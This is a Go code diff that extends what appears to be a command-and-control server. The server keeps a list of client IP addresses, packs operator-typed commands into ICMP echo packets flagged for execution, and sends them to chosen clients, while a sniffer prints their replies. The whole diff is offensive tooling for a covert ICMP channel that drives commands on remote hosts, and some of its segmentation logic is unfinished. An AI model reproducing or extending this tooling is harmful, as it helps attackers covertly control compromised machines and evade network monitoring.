@@ -29,6 +29,9 @@ var DEBUG bool = true
 
 var id int = 0
 var clients = make(map[int]string)
+var SSM bool = true
+var execute = false
+var PACKETQUEUE []icmp.Message
 
 var (
 	buffer = int32(1600)
@@ -91,33 +94,64 @@ func showclients() {
 		keys = append(keys, k)
 	}
 	sort.Ints(keys)
-
 	for _, k := range keys {
 		fmt.Print("Client ", k, " at ", clients[k])
 	}
 }
 
-func generate_packet() icmp.Message {
+func generate_header(segments int) string {
+	segHeader := strconv.Itoa(segments)
+	header := ""
+	if SSM && execute {
+		header += "###11" + segHeader
+	} else if SSM && !execute {
+		header += "###10" + segHeader
+	} else if !SSM && execute {
+		header += "###01" + segHeader
+	} else if !SSM && !execute {
+		header += "###00" + segHeader
+	} else {
+		fmt.Println("How")
+	}
+	return header
+}
+
+func generate_packet(payload string, segment int) {
+	numOfSegments := len(payload) / 1460
+	fmt.Println(numOfSegments)
+	PACKETQUEUE = make([]icmp.Message, numOfSegments+1)
+	// byteSize := len(payload)
+	// if byteSize > 1460 {
+	// 	fmt.Println("Conductor we have a problem!!!!!")
+	// 	firstPayload = payload[0:1460]
+	// 	nextPayload = payload[1460:byteSize]
+	// }
 	packet := icmp.Message{
 		Type: ipv4.ICMPTypeEcho, Code: 0,
 		Body: &icmp.Echo{
 			ID: os.Getpid() & 0xffff, Seq: 1, //<< uint(seq), // TODO
-			Data: []byte("TEST"),
+			Data: []byte(payload),
 		},
 	}
-	return packet
+	PACKETQUEUE[segment] = packet
 }
 
-func send_packet(packet icmp.Message, addr string, c icmp.PacketConn) {
-	binaryEncoding, _ := packet.Marshal(nil)
-	dst, _ := net.ResolveIPAddr("ip4", addr)
-	anInt, err := c.WriteTo(binaryEncoding, dst)
+func send_packet(addr string, c icmp.PacketConn) {
+	for _, packet := range PACKETQUEUE {
+		// fmt.Println("Packet:", addr)
+		binaryEncoding, _ := packet.Marshal(nil)
+		dst, _ := net.ResolveIPAddr("ip4", addr)
+		anInt, err := c.WriteTo(binaryEncoding, dst)
 
-	if err != nil {
-		fmt.Println("I FAILED DOG")
-	} else if anInt != len(binaryEncoding) {
-		fmt.Println("YOU FELL OFF")
+		// fmt.Println(anInt, err)
+
+		if err != nil {
+			fmt.Println("I FAILED DOG")
+		} else if anInt != len(binaryEncoding) {
+			fmt.Println("YOU FELL OFF")
+		}
 	}
+
 }
 
 func deviceExists(name string) bool {
@@ -145,8 +179,8 @@ func sniffer() {
 	source := gopacket.NewPacketSource(handler, handler.LinkType())
 	for packet := range source.Packets() {
 		payload := packet.ApplicationLayer().Payload()
-		fmt.Println(payload)
-		fmt.Println(convert(payload))
+		// fmt.Println(payload)
+		fmt.Println(convert(payload), "received from [IP]")
 	}
 }
 
@@ -154,6 +188,11 @@ func convert(nums []byte) string {
 	var converted string
 	converted = bytes.NewBuffer(nums).String()
 	return converted
+}
+
+func parse_id(id string) int {
+	atoiclient, _ := strconv.Atoi(strings.TrimRight(id, "\r\n"))
+	return atoiclient
 }
 
 func main() {
@@ -186,10 +225,9 @@ func main() {
 			addclient(tokens[1])
 
 		} else if strings.HasPrefix(input, "rm") {
-			tokens := strings.Split(input, " ")
-			clientid := tokens[1]
-			atoiclient, _ := strconv.Atoi(strings.TrimRight(clientid, "\r\n"))
-			removeclient(atoiclient)
+			// tokens := strings.Split(input, " ")
+			// id := parse_id(tokens)
+			// removeclient(id)
 
 		} else if strings.HasPrefix(input, "removeallclients") {
 			removeallclients()
@@ -198,9 +236,19 @@ func main() {
 			showclients()
 
 		} else if strings.HasPrefix(input, "exe") {
-			packet := generate_packet()
-			send_packet(packet, "127.0.0.1", *c)
-			continue
+			_, after, _ := strings.Cut(input, " ")
+			// fmt.Println(after)
+			id, command, _ := strings.Cut(after, " ")
+			command = strings.TrimRight(command, "\r\n")
+			// fmt.Println(id, command)
+			clientid := parse_id(id)
+			ipaddr := strings.TrimRight(clients[clientid], "\r\n")
+			generate_packet(command, 0)
+			if DEBUG {
+				fmt.Println("[DEBUG]", command, "sent to", clients[clientid])
+			}
+			send_packet(ipaddr, *c)
+
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
 
